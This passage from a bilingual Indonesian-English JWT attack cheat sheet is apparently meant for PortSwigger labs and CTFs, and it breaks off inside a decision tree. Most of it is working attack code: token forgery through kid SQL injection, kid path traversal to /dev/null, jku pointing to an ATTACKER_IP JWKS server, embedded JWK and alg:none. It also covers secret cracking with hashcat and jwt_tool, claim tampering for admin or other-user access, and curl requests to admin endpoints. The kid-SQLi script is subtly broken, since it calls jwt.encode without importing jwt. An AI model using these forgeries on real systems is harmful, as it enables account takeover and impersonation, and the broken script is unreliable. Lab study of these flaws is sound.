mungkin terjadi SQL injection.

PortSwigger mendokumentasikan kedua konsep tersebut.

---

## SQL Injection Concept

Payload:

```json
{
  "kid": "' UNION SELECT 'secret'--"
}
```

### Craft Token

```bash
# Build a lab JWT containing a SQL-injection style kid value.
python3 - <<'PY'
import base64
import json

def enc(x):
    return base64.urlsafe_b64encode(
        json.dumps(x, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()

header = {
    "alg": "HS256",
    "typ": "JWT",
    "kid": "' UNION SELECT 'secret'--"
}

payload = {
    "sub": "administrator",
    "role": "admin"
}

# Sign token dengan secret yang diprediksi dari SQL result (misal "mysecret")
# Server akan mengeksekusi: SELECT key FROM keys WHERE kid = '' UNION SELECT 'mysecret'--'
# sehingga server menggunakan 'mysecret' untuk memverifikasi signature.

token = jwt.encode(
    payload,
    "mysecret",  # secret yang cocok dengan hasil SQL UNION
    algorithm="HS256",
    headers=header
)
print(token)
PY
```

---

## curl

```bash
# Send the kid-SQLi candidate token to the lab endpoint.
curl -i \
  -H 'Authorization: Bearer FORGED_TOKEN' \
  http://TARGET/admin
```

Indikasi:

```text
SQL syntax error
different response
500
admin access
```

---

### 📌 Kapan Digunakan

Gunakan jika:

```text
kid
 ↓
database-backed key lookup
```

atau application error mengarah ke SQL.

---

# `kid` Path Traversal

Konsep:

```json
{
  "kid": "../../../../dev/null",
  "alg": "HS256"
}
```

Jika server membuka:

```text
key_directory + kid
```

maka attacker mungkin mengarahkan key loader ke file arbitrary/predictable.

PortSwigger menggunakan `/dev/null` pada lab tertentu karena file tersebut memiliki isi kosong.

---

## Example Token

```text
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ii4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIiwicm9sZSI6ImFkbWluIn0.signature_here
```

---

## curl

```bash
# Send a kid path-traversal candidate against an authorized lab target.
curl -i \
  -H 'Authorization: Bearer FORGED_TOKEN' \
  http://TARGET/admin
```

Untuk server Linux yang vulnerable terhadap `/dev/null` trick, signing secret dapat menjadi empty string.

---

## Manual Signing

```bash
# Generate a token signed with an empty HS256 secret for a lab implementing the /dev/null kid flaw.
python3 - <<'PY'
import jwt

token = jwt.encode(
    {
        "sub": "administrator",
        "role": "admin"
    },
    "",
    algorithm="HS256",
    headers={
        "kid": "../../../../../../../dev/null"
    }
)

print(token)
PY
```

---

### 📌 Kapan Digunakan

Gunakan ketika ditemukan:

```text
kid
+
filesystem-based key selection
```

---

# 2.5 🌐 `jku` — JWK Set URL Injection

## Konsep

Attacker membuat:

```text
RSA private key
      │
      ▼
matching public JWK
      │
      ▼
JWKS server
```

Kemudian token:

```json
{
  "alg": "RS256",
  "kid": "attacker",
  "jku": "http://ATTACKER/jwks.json"
}
```

Target:

```text
jku
 ↓
fetch JWKS
 ↓
find attacker key
 ↓
verify attacker's signature
```

PortSwigger menjelaskan `jku` sebagai URL tempat server mengambil JWK Set, dan security failure terjadi ketika server tidak membatasi trusted hosts.

---

## Generate RSA Key Pair

```bash
# Generate a private RSA key for the lab.
openssl genrsa -out attacker_private.pem 2048
```

```bash
# Export the public key.
openssl rsa \
  -in attacker_private.pem \
  -pubout \
  -out attacker_public.pem
```

---

## Generate JWKS dengan Python

Install:

```bash
# Install the cryptography package for local JWK generation.
python3 -m pip install cryptography
```

Script:

```bash
# Generate a JWKS document from the attacker's RSA public key.
python3 - <<'PY'
import base64
import json
from cryptography.hazmat.primitives import serialization

def b64u(data):
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

with open("attacker_private.pem", "rb") as f:
    private = serialization.load_pem_private_key(
        f.read(),
        password=None
    )

public = private.public_key()
numbers = public.public_numbers()

n = numbers.n.to_bytes((numbers.n.bit_length() + 7) // 8, "big")
e = numbers.e.to_bytes((numbers.e.bit_length() + 7) // 8, "big")

jwks = {
    "keys": [
        {
            "kty": "RSA",
            "kid": "attacker",
            "use": "sig",
            "alg": "RS256",
            "n": b64u(n),
            "e": b64u(e)
        }
    ]
}

with open("jwks.json", "w") as f:
    json.dump(jwks, f, indent=2)

print(json.dumps(jwks, indent=2))
PY
```

---

## Serve JWKS

```bash
# Start a simple HTTP server from the directory containing jwks.json.
python3 -m http.server 8000 --bind 0.0.0.0
```

Check locally:

```bash
# Verify that jwks.json is served.
curl -i \
  http://127.0.0.1:8000/jwks.json
```

---

## Craft Token

```bash
# Sign a modified JWT using the attacker's RSA private key and point jku to the lab JWKS server.
python3 - <<'PY'
import jwt

with open("attacker_private.pem", "rb") as f:
    key = f.read()

token = jwt.encode(
    {
        "sub": "administrator",
        "role": "admin"
    },
    key,
    algorithm="RS256",
    headers={
        "kid": "attacker",
        "jku": "http://ATTACKER_IP:8000/jwks.json"
    }
)

print(token)
PY
```

---

## curl

```bash
# Send the JKU-injected forged token to the lab target.
curl -i \
  -H 'Authorization: Bearer FORGED_TOKEN' \
  http://TARGET/admin
```

At attacker terminal:

```text
# Example realistic callback log from the local JWKS server.
10.10.10.50 - - [07/Sep/2026 15:10:22]
"GET /jwks.json HTTP/1.1" 200 -
```

---

## Netcat Alternative

```bash
# Start a TCP listener for observing raw HTTP requests in a simple lab.
nc -lvnp 8000
```

Namun `nc` tidak otomatis serve valid JSON. Untuk actual JWKS serving:

```bash
# Serve the JWKS file with Python's built-in HTTP server.
python3 -m http.server 8000 --bind 0.0.0.0
```

### 📌 Kapan Digunakan

Prioritaskan:

```text
RS256
+
jku present/accepted
+
server can make outbound request
```

---

# 2.6 🧬 `jwk` Embedded JWK Attack

## Konsep

Attacker membuat:

```text
private key
+
public key
```

kemudian memasukkan public key ke JWT:

```json
{
  "alg": "RS256",
  "jwk": {
    "kty": "RSA",
    "n": "...",
    "e": "AQAB"
  }
}
```

Server flawed:

```text
JWT
 ↓
read jwk
 ↓
use attacker key
 ↓
verify attacker signature
```

PortSwigger mendokumentasikan attack ini secara langsung dan menggunakan JWT Editor untuk menghasilkan RSA key lalu menanamkan public JWK ke header.

---

## Generate JWK

```bash
# Generate a compact JWK from the lab RSA private key.
python3 - <<'PY'
import base64
import json
from cryptography.hazmat.primitives import serialization

def b64u(v):
    return base64.urlsafe_b64encode(v).rstrip(b"=").decode()

with open("attacker_private.pem", "rb") as f:
    private = serialization.load_pem_private_key(f.read(), password=None)

public = private.public_key()
numbers = public.public_numbers()

n = numbers.n.to_bytes((numbers.n.bit_length()+7)//8, "big")
e = numbers.e.to_bytes((numbers.e.bit_length()+7)//8, "big")

jwk = {
    "kty": "RSA",
    "kid": "attacker",
    "use": "sig",
    "alg": "RS256",
    "n": b64u(n),
    "e": b64u(e)
}

print(json.dumps(jwk))
PY
```

---

## Forge Token

```bash
# Sign a modified token and embed the attacker's public JWK.
python3 - <<'PY'
import jwt
import base64
import json
from cryptography.hazmat.primitives import serialization

def b64u(v):
    return base64.urlsafe_b64encode(v).rstrip(b"=").decode()

with open("attacker_private.pem", "rb") as f:
    private = serialization.load_pem_private_key(f.read(), password=None)

numbers = private.public_key().public_numbers()

n = numbers.n.to_bytes((numbers.n.bit_length()+7)//8, "big")
e = numbers.e.to_bytes((numbers.e.bit_length()+7)//8, "big")

jwk = {
    "kty": "RSA",
    "kid": "attacker",
    "use": "sig",
    "alg": "RS256",
    "n": b64u(n),
    "e": b64u(e)
}

token = jwt.encode(
    {
        "sub": "administrator",
        "role": "admin"
    },
    private,
    algorithm="RS256",
    headers={
        "kid": "attacker",
        "jwk": jwk
    }
)

print(token)
PY
```

---

## curl

```bash
# Test the forged JWK-embedded token against the lab.
curl -i \
  -H 'Authorization: Bearer FORGED_TOKEN' \
  http://TARGET/admin
```

### 📌 Kapan Digunakan

Gunakan saat:

```text
RS256
+
jwk header accepted
```

dan server belum membuktikan key tersebut trusted.

---

# 2.7 📜 `x5u` / `x5c` Token Forgery

## `x5u`

```text
x5u
 ↓
remote certificate
 ↓
public key
 ↓
signature verification
```

Attack bila:

```text
server accepts attacker URL
```

---

## `x5c`

```text
JWT
+
self-signed certificate
```

Attack bila implementation langsung mempercayai certificate yang ada di token.

PortSwigger mencatat `x5u` dan `x5c` sebagai header parameters yang dapat menjadi attack surface ketika trust handling salah.

---

### 📌 Kapan Digunakan

Tidak se-prioritas:

```text
none
weak secret
jwk
jku
kid
algorithm confusion
```

kecuali application jelas menggunakan certificate-based JWT verification.

---

# 2.8 ♻️ Token Replay Attack

Replay berarti:

```text
VALID TOKEN
    ↓
captured
    ↓
reused later
```

---

## Basic Replay

```bash
# Replay a still-valid lab token.
curl -i \
  -H 'Authorization: Bearer ORIGINAL_LAB_TOKEN' \
  http://TARGET/my-account
```

Jika tetap diterima:

```text
replay possible
```

---

## Expired Token

```bash
# Replay an expired token in an authorized lab.
curl -i \
  -H 'Authorization: Bearer EXPIRED_LAB_TOKEN' \
  http://TARGET/my-account
```

Secure:

```text
401 Unauthorized
```

Vulnerable:

```text
200 OK
```

---

## Logout Replay

```bash
# Perform the lab logout request.
curl -i \
  -H 'Authorization: Bearer ORIGINAL_LAB_TOKEN' \
  -X POST \
  http://TARGET/logout
```

Kemudian:

```bash
# Replay the same token after logout.
curl -i \
  -H 'Authorization: Bearer ORIGINAL_LAB_TOKEN' \
  http://TARGET/my-account
```

---

### 📌 Kapan Digunakan

Gunakan bila:

```text
long-lived JWT
+
no obvious revocation
+
logout flow
```

---

# 2.9 📡 JWT Information Disclosure

JWT payload bukan encrypted by default.

Contoh:

```json
{
  "sub": "100",
  "email": "alice@example.test",
  "role": "admin",
  "department": "finance",
  "internal_id": "EMP-0091"
}
```

Jangan memasukkan:

```text
password
API secret
private key
session secret
sensitive internal data
```

ke payload JWT.

---

## Decode

```bash
# Decode a JWT payload to identify potentially sensitive claims.
python3 -c 'import base64,json; t="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJlbWFpbCI6ImFsaWNlQGV4YW1wbGUudGVzdCIsInJvbGUiOiJhZG1pbiJ9.signature_here"; p=t.split(".")[1]; p+="="*((4-len(p)%4)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))'
```

---

### Common Sensitive Fields

```text
email
username
internal_id
user_id
role
permissions
department
tenant_id
organization_id
feature_flags
API metadata
internal URLs
```

### 📌 Kapan Digunakan

Selalu.

Decode payload adalah first-pass recon termurah.

---

# 🧪 3 — Claim Manipulation

# 3.1 👑 Role/Permission Manipulation

Contoh token:

```json
{
  "sub": "100",
  "role": "user",
  "is_admin": false,
  "permissions": [
    "profile:read"
  ]
}
```

Target perubahan:

```json
{
  "sub": "100",
  "role": "admin",
  "is_admin": true,
  "permissions": [
    "profile:read",
    "admin:read",
    "admin:write"
  ]
}
```

Tetapi:

```text
PAYLOAD MODIFIED
      ≠
VALID TOKEN
```

Harus ada:

```text
signature bypass
atau
known secret/private key
```

---

## Flow Lengkap

```text
JWT
 ↓
Decode
 ↓
Identify security claims
 ↓
Modify claims
 ↓
Obtain valid signature
 ↓
Send forged token
 ↓
Request privileged resource
 ↓
Observe authorization
```

---

## Forge dengan Known Secret

```bash
# Create an admin token using a known weak lab secret.
python3 - <<'PY'
import jwt

token = jwt.encode(
    {
        "sub": "100",
        "role": "admin",
        "is_admin": True,
        "permissions": [
            "profile:read",
            "admin:read",
            "admin:write"
        ]
    },
    "secret123",
    algorithm="HS256"
)

print(token)
PY
```

curl:

```bash
# Test the forged role token against an admin-only lab endpoint.
curl -i \
  -H 'Authorization: Bearer FORGED_TOKEN' \
  http://TARGET/admin
```

### 📌 Kapan Digunakan

Setelah:

```text
secret known
or
signature bypass confirmed
```

---

# 3.2 🆔 User ID Manipulation — JWT + IDOR

JWT:

```json
{
  "sub": "100",
  "user_id": "100"
}
```

Attacker mencoba:

```json
{
  "sub": "101",
  "user_id": "101"
}
```

Jika server mempercayai claim:

```text
User A token
    ↓
sub=101
    ↓
Server identifies User B
```

Ini bisa menjadi:

```text
JWT manipulation
+
IDOR / impersonation
```

Cross-reference:

← [File 27: IDOR](/docs/idor-access-control)

---

## Forge

```bash
# Forge a JWT changing sub and user_id with a known CTF secret.
python3 - <<'PY'
import jwt

token = jwt.encode(
    {
        "sub": "101",
        "user_id": "101",
        "role": "user"
    },
    "secret123",
    algorithm="HS256"
)

print(token)
PY
```

curl:

```bash
# Request the account endpoint using the manipulated identity token.
curl -i \
  -H 'Authorization: Bearer FORGED_TOKEN' \
  http://TARGET/api/profile
```

---

### 📌 Kapan Digunakan

Gunakan ketika JWT claim dan API object reference memiliki hubungan langsung:

```text
JWT sub
   ↕
user_id
   ↕
/api/users/<id>
```

---

# 3.3 ⏳ Expiry Manipulation

Original:

```json
{
  "exp": 1788747600
}
```

Forge:

```json
{
  "exp": 4102444800
}
```

atau hapus:

```json
{}
```

---

## Create Future Expiry

```bash
# Create a lab token with a far-future expiration.
python3 - <<'PY'
import jwt

token = jwt.encode(
    {
        "sub": "100",
        "role": "user",
        "exp": 4102444800
    },
    "secret123",
    algorithm="HS256"
)

print(token)
PY
```

---

## Missing `exp`

```bash
# Create a token without exp to test whether the server requires expiration.
python3 - <<'PY'
import jwt

token = jwt.encode(
    {
        "sub": "100",
        "role": "user"
    },
    "secret123",
    algorithm="HS256"
)

print(token)
PY
```

### 📌 Kapan Digunakan

Test:

```text
exp
nbf
iat
```

setelah signature trust sudah dipahami.

---

# 🛠️ 4 — Tools Workflow

# 4.1 🤖 jwt_tool Complete Workflow

## Install

```bash
# Clone jwt_tool.
git clone https://github.com/ticarpi/jwt_tool.git

# Enter the directory.
cd jwt_tool

# Install Python dependencies.
python3 -m pip install -r requirements.txt
```

---

## Basic Decode

```bash
# Decode a JWT and review header/payload.
python3 jwt_tool.py \
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here'
```

---

## Interactive Tampering

```bash
# Open jwt_tool's interactive tampering mode.
python3 jwt_tool.py \
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here' \
  -T
```

---

## None Algorithm

```bash
# Test alg:none.
python3 jwt_tool.py \
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here' \
  -X a
```

Current jwt_tool documentation maps `-X a` to `alg:none`.

---

## Algorithm Confusion

```bash
# Test key/algorithm confusion using a known RSA public key.
python3 jwt_tool.py \
  'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMDAifQ.signature_here' \
  -X k \
  -pk public.pem
```

> **Important:** `-X k` = key confusion in current jwt_tool documentation. `-X s` is spoofing a remote JWKS, not RS256→HS256 key confusion.

---

## Crack

```bash
# Crack a weak HMAC secret using a dictionary.
python3 jwt_tool.py \
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAifQ.signature_here' \
  -C \
  -d jwt_secrets.txt
```

`-C -d` is the documented jwt_tool dictionary attack syntax.

---

## JKU / Spoof JWKS

```bash
# Test spoofed JWKS using a lab JWKS server.
python3 jwt_tool.py \
  'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMDAifQ.signature_here' \
  -X s \
  -ju http://ATTACKER_IP:8000/jwks.json
```

Current jwt_tool documentation maps `-X s` to spoofed JWKS.

---

## Inline JWK

```bash
# Test embedded JWK injection.
python3 jwt_tool.py \
  'eyJhbGciOiJSUzI1NiJ9.eyJzdWIiOiIxMDAifQ.signature_here' \
  -X i
```

---

## Playbook Scan

Current jwt_tool documentation describes:

```text
-M pb
```

for Playbook Scan.

```bash
# Run jwt_tool's playbook scan using a lab token and target.
python3 jwt_tool.py \
  'JWT_TOKEN' \
  -t http://TARGET \
  -rc 'session=JWT_TOKEN' \
  -M pb
```

---

## `-ru URL` Note (Klarifikasi Versi jwt_tool 2.x vs 3.x)

Be aware:

```text
-ru URL
```

muncul di beberapa tutorial / catatan JWT lama. Di `jwt_tool` versi 3.x (current CLI):
1. **Standalone token test**: Jalankan langsung `python3 jwt_tool.py TOKEN` (tanpa `-t`).
2. **Active scan**: Gunakan `python3 jwt_tool.py TOKEN -t TARGET -M pb`.

Parameter `-ru URL` berasal dari sintaks `jwt_tool` 2.x terdahulu:

```text
-t TARGET
-rh HEADER
-rc COOKIE
-M pb
```

Use:

```bash
# Inspect the installed jwt_tool version and supported flags.
python3 jwt_tool.py -h
```

as the source of truth for the exact binary installed locally.

---

## Example Output — None

```text
# Example output, abbreviated to the meaningful findings.
[*] JWT successfully parsed
[+] Testing alg:none
[+] Token generated with alg:none
[!] Server response differs from signed token
```

---

## Example Output — Crack

```text
# Example realistic crack result.
[*] Testing dictionary entries
[+] MATCH FOUND
[+] Secret: secret123
```

---

## Example Output — JKU

```text
# Example realistic JWKS interaction.
[*] Spoofing JWKS
[+] JWKS URL: http://10.10.14.5:8000/jwks.json
[+] Remote key accepted
```

---

### 📌 Kapan Digunakan

Workflow:

```text
decode
 ↓
scan
 ↓
specific attack
 ↓
manual verification
```

Jangan berhenti di:

```text
"tool says vulnerable"
```

---

# 4.2 🐍 Python3 Manual JWT Crafting

Buat file:

```bash
# Create the JWT crafter script.
nano jwt_crafter.py
```

Isi:

```python
#!/usr/bin/env python3

import argparse
import base64
import json
import sys
from pathlib import Path

import jwt


def b64decode_json(value: str):
    padding = "=" * (-len(value) % 4)
    raw = base64.urlsafe_b64decode(value + padding)
    return json.loads(raw)


def decode_token(token: str):
    parts = token.split(".")

    if len(parts) != 3:
        raise ValueError("JWT must contain exactly 3 parts")

    header = b64decode_json(parts[0])
    payload = b64decode_json(parts[1])

    return header, payload


def main():
    parser = argparse.ArgumentParser(
        description="JWT lab token decoder/modifier/signer"
    )

    parser.add_argument(
        "token",
        help="JWT token"
    )

    parser.add_argument(
        "--set",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Modify a claim"
    )

    parser.add_argument(
        "--secret",
        help="HMAC secret for signing"
    )

    parser.add_argument(
        "--algorithm",
        default="HS256",
        help="Signing algorithm"
    )

    parser.add_argument(
        "--header",
        action="append",
        default=[],
        metavar="KEY=VALUE",
        help="Modify a header value"
    )

    args = parser.parse_args()

    try:
        header, payload = decode_token(args.token)
    except Exception as exc:
        print(f"[!] Unable to decode JWT: {exc}")
        sys.exit(1)

    print("[+] Original header:")
    print(json.dumps(header, indent=2))

    print("\n[+] Original payload:")
    print(json.dumps(payload, indent=2))

    # Modify payload claims.
    for item in args.set:
        if "=" not in item:
            print(f"[!] Invalid --set value: {item}")
            sys.exit(1)

        key, value = item.split("=", 1)

        # Basic automatic type conversion.
        if value.lower() == "true":
            value = True
        elif value.lower() == "false":
            value = False
        elif value.isdigit():
            value = int(value)

        payload[key] = value

    # Modify headers.
    for item in args.header:
        if "=" not in item:
            print(f"[!] Invalid --header value: {item}")
            sys.exit(1)

        key, value = item.split("=", 1)
        header[key] = value

    print("\n[+] Modified header:")
    print(json.dumps(header, indent=2))

    print("\n[+] Modified payload:")
    print(json.dumps(payload, indent=2))

    if not args.secret:
        print("\n[!] No signing secret supplied.")
        print("[!] Modified unsigned structure is not a valid authenticated JWT.")
        sys.exit(0)

    # Modern PyJWT / header alg=none handling:
    # Note: Ketika --header alg=none diset, jwt.encode() akan me-override header dengan parameter algorithm.
    # Jika algorithm=none diset, PyJWT modern menolaknya. Maka gunakan manual base64 encoding untuk alg=none.
    if args.algorithm.lower() == "none" or header.get("alg", "").lower() == "none":
        header["alg"] = "none"
        def b64u(val):
            raw = json.dumps(val, separators=(",", ":")).encode()
            return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
        token = f"{b64u(header)}.{b64u(payload)}."
    else:
        if not args.secret:
            print("\n[!] No signing secret supplied for HMAC algorithm.")
            sys.exit(1)
        try:
            token = jwt.encode(
                payload,
                args.secret,
                algorithm=args.algorithm,
                headers=header
            )
        except Exception as exc:
            print(f"[!] Signing failed: {exc}")
            sys.exit(1)

    print("\n[+] Forged token:")
    print(token)


if __name__ == "__main__":
    main()
```

---

## Permission

```bash
# Make the script executable.
chmod +x jwt_crafter.py
```

---

## Install Dependency

```bash
# Install PyJWT for local CTF token creation and verification.
python3 -m pip install pyjwt
```

---

## Decode

```bash
# Decode a JWT without signing changes.
python3 jwt_crafter.py \
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here'
```

---

## Modify

```bash
# Change role and add an admin claim in the lab token.
python3 jwt_crafter.py \
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here' \
  --set role=admin \
  --set is_admin=true
```

---

## Sign

```bash
# Re-sign modified claims using a known lab secret.
python3 jwt_crafter.py \
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here' \
  --set role=admin \
  --set is_admin=true \
  --secret secret123 \
  --algorithm HS256
```

---

## Change Header

```bash
# Change the JWT algorithm header for a controlled lab test.
python3 jwt_crafter.py \
  'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMDAiLCJyb2xlIjoidXNlciJ9.signature_here' \
  --header alg=none
```

---

## Pure Python JWT Crafting (Tanpa Library / Fallback Edge Cases)

Pada beberapa kasus CTF, library PyJWT menolak request tertentu (seperti `alg=none` atau PEM public key confusion). Gunakan script Pure Python murni tanpa library eksternal ini:

```python
import base64
import json
import hmac
import hashlib

def b64u(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()

def craft_jwt(header, payload, secret=None):
    h = b64u(json.dumps(header, separators=(",", ":")))
    p = b64u(json.dumps(payload, separators=(",", ":")))
    
    if secret is None or header.get("alg", "").lower() == "none":
        # alg=none: trailing dot, tanpa signature
        return f"{h}.{p}."
    
    msg = f"{h}.{p}".encode()
    
    if header.get("alg") == "HS256":
        if isinstance(secret, str):
            secret = secret.encode()
        sig = hmac.new(secret, msg, hashlib.sha256).digest()
        return f"{h}.{p}.{b64u(sig)}"

# 1. None algorithm test
print("=== alg:none ===")
token_none = craft_jwt(
    {"alg": "none", "typ": "JWT"},
    {"sub": "administrator", "role": "admin"}
)
print(token_none)

# 2. HS256 dengan known secret
print("\n=== HS256 ===")
token_hs256 = craft_jwt(
    {"alg": "HS256", "typ": "JWT"},
    {"sub": "administrator", "role": "admin"},
    secret="secret123"
)
print(token_hs256)
```

---

### 📌 Kapan Digunakan

Gunakan `jwt_crafter.py` atau script Pure Python saat:

```text
jwt_tool terlalu abstrak
+
ingin memahami setiap byte/claim
```

---

# 4.3 🧪 hashcat JWT Cracking

## Format Input

JWT ditulis utuh:

```text
HEADER.PAYLOAD.SIGNATURE
```

Jangan hanya menyimpan signature.

---

## Command

```bash
# Run a JWT dictionary attack.
hashcat -a 0 -m 16500 token.txt jwt_secrets.txt
```

---

## Rules

```bash
# Apply hashcat best64 mutation rules to a targeted password list.
hashcat \
  -a 0 \
  -m 16500 \
  token.txt \
  custom.txt \
  -r /usr/share/hashcat/rules/best64.rule
```

---

## Brute Force Terbatas

```bash
# Try a narrow six-character lowercase pattern in a lab.
hashcat \
  -a 3 \
  -m 16500 \
  token.txt \
  '?l?l?l?l?l?l'
```

Gunakan narrow candidates dulu.

---

## Interpretasi

```text
Recovered: 0
```

berarti:

```text
secret belum ditemukan
```

bukan:

```text
JWT aman
```

Mungkin:

```text
secret panjang
secret tidak ada di wordlist
secret random
```

---

### 📌 Kapan Digunakan

Gunakan offline cracking pada:

```text
HS256
HS384
HS512
```

saat weak-secret hypothesis masuk akal.

---

# 4.4 🕵️ Burp Suite JWT Testing

## Workflow

```text
Browser
  ↓
Burp Proxy
  ↓
JWT discovered
  ↓
Repeater
  ↓
JWT Editor
  ↓
Decode
  ↓
Modify
  ↓
Sign
  ↓
Send
```

---

## JWT Editor

Install:

```text
Burp
→ Extensions
→ BApp Store
→ JWT Editor
```

JWT Editor dapat:

```text
generate RSA key
generate symmetric key
edit token
embed JWK
sign JWT
```

PortSwigger mendokumentasikan alur tersebut secara resmi untuk JWT testing.

---

## Modify Payload

Original:

```json
{
  "sub": "wiener",
  "role": "user"
}
```

Modify:

```json
{
  "sub": "administrator",
  "role": "admin"
}
```

---

## Modify Header

```json
{
  "alg": "none",
  "typ": "JWT"
}
```

---

## Sign dengan Symmetric Key

Untuk known secret:

```text
JWT Editor
→ Keys
→ New Symmetric Key
→ Sign
```

---

### 📌 Kapan Digunakan

Burp menjadi tool utama ketika:

```text
JWT ada di Cookie
JWT ada di Authorization
request kompleks
CSRF/session state
```

---

# 🧪 5 — PortSwigger Lab Patterns

> PortSwigger saat ini menyediakan beberapa JWT labs yang memang dirancang khusus untuk vulnerability classes di bawah ini.

---

# 5.1 🚪 JWT Authentication Bypass via Unverified Signature

## Pattern

```text
JWT found
 ↓
sub=wiener
 ↓
change sub=administrator
 ↓
signature tetap/diabaikan
 ↓
admin access
```

PortSwigger's current lab menggunakan `wiener:peter`, JWT session cookie, dan admin endpoint `/admin`.

### 📌 Langkah Eksploitasi Konkret:
1. **Login sebagai `wiener:peter`** untuk mendapatkan cookie session valid.
2. **Capture cookie `session` JWT** dari HTTP request / browser storage.
3. **Decode payload** -> perhatikan claim `"sub": "wiener"`.
4. **Modifikasi `sub` menjadi `"administrator"`** (hapus signature atau biarkan jika server mengabaikan verifikasi).
5. **Kirim request ke `/admin`** menggunakan token baru.

---

## Trigger

```text
alg=HS256
+
server doesn't actually verify signature
```

---

## Tool

```text
Burp Repeater
JWT Editor
```

---

## Request

```bash
# Recreate the lab-style request with an unsigned administrator token.
curl -i \
  -H 'Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.' \
  https://LAB_ID.web-security-academy.net/admin
```

---

## Expected

```text
HTTP/2 200 OK

<h1>Admin panel</h1>
```

---

### 📌 Kapan Digunakan

Ketika:

```text
signature can be modified
+
server continues to trust claims
```

---

# 5.2 ⚠️ JWT Authentication Bypass via Flawed Signature Verification

PortSwigger membedakan lab ini sebagai server yang menerima unsigned JWT dengan `alg=none`.

## Trigger

```text
Modify:
sub
alg=none
remove signature
keep trailing dot
```

---

## curl

```bash
# Send an unsigned JWT with the mandatory trailing dot.
curl -i \
  -H 'Cookie: session=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbmlzdHJhdG9yIn0.' \
  https://LAB_ID.web-security-academy.net/admin
```

---

## Expected

```text
HTTP/2 200 OK
```

---

### 📌 Kapan Digunakan

Saat signature verification tampak flawed.

---

# 5.3 🔑 JWT Authentication Bypass via Weak Signing Key

## Trigger

```text
HS256
 ↓
weak secret
 ↓
hashcat
 ↓
secret recovered
 ↓
forge admin token
```

PortSwigger secara eksplisit merekomendasikan hashcat pada lab ini.

---

## Tool

```bash
# Crack the lab JWT using a candidate secret list.
hashcat -a 0 -m 16500 token.txt jwt_secrets.txt
```

---

## Forge

```bash
# Forge the administrator token with the recovered secret.
python3 - <<'PY'
import jwt
print(jwt.encode(
    {"sub":"administrator"},
    "secret123",
    algorithm="HS256"
))
PY
```

---

## Expected

```text
HTTP/2 200 OK

Admin panel
```

---

### 📌 Kapan Digunakan

Saat HS256 ditemukan dan secret tampak weak.

---

# 5.4 🧬 JWT Authentication Bypass via JWK Header Injection

## Trigger

```text
RS256
+
jwk accepted
+
attacker key trusted
```

PortSwigger's lab intentionally fails to verify that the embedded JWK came from a trusted source.

---

## Tool

```text
Burp
→ JWT Editor
→ Keys
→ New RSA Key
```

Kemudian:

```text
JWT Editor
→ Attack
→ Embedded JWK
```

---

## curl

```bash
# Send the forged JWK-injected token.
curl -i \
  -H 'Authorization: Bearer FORGED_JWK_TOKEN' \
  https://LAB_ID.web-security-academy.net/admin
```

---

## Expected

```text
HTTP/2 200 OK

Admin panel
```

---

### 📌 Kapan Digunakan

Ketika:

```text
RS256
+
jwk parameter appears/accepted
```

---

# 5.5 🌐 JWT Authentication Bypass via JKU Header Injection

## Trigger

```text
RS256
+
jku
+
server fetches attacker JWKS
```

---

## Setup

```bash
# Serve the attacker-controlled JWKS.
python3 -m http.server 8000 --bind 0.0.0.0
```

---

## Test

```bash
# Request the lab with a JKU forged token.
curl -i \
  -H 'Authorization: Bearer FORGED_JKU_TOKEN' \
  https://LAB_ID.web-security-academy.net/admin
```

Expected attacker-side request:

```text
GET /jwks.json HTTP/1.1
```

---

## Expected Result

```text
HTTP/2 200 OK

Admin panel
```

---

### 📌 Kapan Digunakan

Ketika:

```text
jku present
+
target can make outbound HTTP
```

---

# 5.6 🗂️ JWT Authentication Bypass via KID Path Traversal

## Trigger

```text
HS256
+
kid controls filesystem path
+
predictable file contents
```

PortSwigger's current lab specifically documents `/dev/null` and an empty HMAC secret as a working technique.

---

## Forge

```bash
# Forge a lab token that points kid to /dev/null.
python3 - <<'PY'
import jwt

token = jwt.encode(
    {"sub":"administrator"},
    "",
    algorithm="HS256",
    headers={
        "kid":"../../../../../../../dev/null"
    }
)

print(token)
PY
```

---

## curl

```bash
# Send the forged kid-path-traversal token to the lab admin endpoint.
curl -i \
  -H 'Authorization: Bearer FORGED_KID_TOKEN' \
  https://LAB_ID.web-security-academy.net/admin
```

---

## Expected

```text
HTTP/2 200 OK

Admin panel
```

---

### 📌 Kapan Digunakan

Ketika:

```text
kid
+
filesystem key lookup
```

---

# 🌳 6 — Decision Tree

```text
                         ┌─────────────────┐
                         │ JWT FOUND       │
                         └────────┬────────┘
                                  │
                                  ▼
                       ┌─────────────────────┐
                       │ Decode Header       │
                       │ Decode Payload      │
                       └──────────┬──────────┘
                                  │
                                  ▼
                       ┌─────────────────────┐
                       │ What is alg?        │
                       └──────────┬──────────┘
